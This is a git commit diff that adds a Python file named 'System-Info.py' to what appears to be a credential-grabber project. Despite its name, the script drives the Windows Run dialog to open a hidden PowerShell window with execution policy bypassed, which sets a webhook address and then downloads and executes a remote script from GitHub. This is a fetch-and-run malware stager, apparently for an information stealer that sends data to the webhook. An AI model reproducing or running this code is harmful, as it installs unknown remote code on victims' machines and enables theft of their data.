221e1f68d3a23014edb48ba1f66a720b60b7e236
Powercascade <powercascade28@gmail.com>
2025-01-07 10:20:55 -0600

    Add files via upload

---
+++ Options/System-Info.py
@@ -0,0 +1,9 @@
+import time
+import subprocess
+import pyautogui
+
+time.sleep(1)
+pyautogui.hotkey('win', 'r')
+time.sleep(0.75)
+pyautogui.write(f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/taktikal | iex")
+pyautogui.press('enter')
